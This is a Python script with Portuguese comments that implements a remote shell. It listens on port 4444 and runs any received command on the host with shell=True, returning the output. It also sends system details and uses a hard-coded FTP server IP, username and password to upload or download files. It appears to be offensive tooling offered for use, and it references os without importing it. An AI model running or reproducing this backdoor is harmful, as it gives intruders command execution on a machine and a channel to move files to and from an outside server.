import socket
from ftplib import FTP
import subprocess
import platform

class RemoteShell:
    def __init__(self, port=4444, ftp_server="44.241.66.173", ftp_port=21):
        self.PORT = port
        self.ftp_server = ftp_server
        self.ftp_port = ftp_port  # Porta FTP, padrão é 21
        self.ftp_user = 'dlpuser'  # Usuário para login FTP
        self.ftp_password = 'rNrKYTX9g7z3RgJRmxWuGHbeu'  # Senha para login FTP

    def execute_command(self, command):
        """Executa um comando no sistema e retorna a saída."""
        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
            return output.decode()
        except subprocess.CalledProcessError as e:
            return str(e)
        except Exception as e:
            return str(e)

    def ftp_command(self, command):
        """Executa um comando FTP e retorna a saída."""
        try:
            # Conecta ao servidor FTP com o usuário e senha fornecidos e usa a porta 21
            ftp = FTP()
            ftp.connect(self.ftp_server, self.ftp_port)  # Conectar usando a porta 21 (FTP padrão)
            ftp.login(user=self.ftp_user, passwd=self.ftp_password)  # Autenticação com usuário e senha

            if command.lower().startswith('list'):
                return ftp.retrlines('LIST')
            elif command.lower().startswith('get'):
                filename = command.split(' ')[1]
                with open(filename, 'wb') as f:
                    ftp.retrbinary(f'RETR {filename}', f.write)
                return f"Arquivo {filename} baixado com sucesso."
            elif command.lower().startswith('put'):
                filename = command.split(' ')[1]
                with open(filename, 'rb') as f:
                    ftp.storbinary(f'STOR {filename}', f)
                return f"Arquivo {filename} enviado com sucesso."
            else:
                return "Comando FTP desconhecido."
        except Exception as e:
            return f"Erro no comando FTP: {e}"

    def get_system_info(self):
        """Retorna informações do sistema."""
        try:
            system_info = f"System: {platform.system()} {platform.release()}\n"
            system_info += f"Node Name: {platform.node()}\n"
            system_info += f"Processor: {platform.processor()}\n"
            system_info += f"Machine: {platform.machine()}\n"
            system_info += f"Python Version: {platform.python_version()}\n"
            return system_info
        except Exception as e:
            return str(e)

    def main(self):
        """Conecta ao host e aguarda comandos."""
        print("Conectando ao host...")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', self.PORT))
        server.listen(1)
        print(f"Aguardando conexão na porta {self.PORT}...")

        connection, address = server.accept()
        print(f"Conexão recebida de {address}")

        with connection:
            # Envia informações do sistema
            connection.send("Conectado ao servidor remoto.\n".encode())
            connection.send(f"Nome da máquina: {platform.node()}\n".encode())
            connection.send(f"Diretório atual: {os.getcwd()}\n".encode())

            while True:
                # Aguarda um comando do cliente
                command = connection.recv(1024).decode()
                if command.strip().lower() == 'exit':
                    break
                elif command.strip().lower() == 'system_info':
                    system_info = self.get_system_info()
                    connection.send(system_info.encode())
                elif command.strip().lower().startswith('ftp'):
                    ftp_output = self.ftp_command(command)
                    connection.send(ftp_output.encode())
                else:
                    output = self.execute_command(command)
                    connection.send(output.encode())

if __name__ == "__main__":
    remote_shell = RemoteShell()
    remote_shell.main()
    
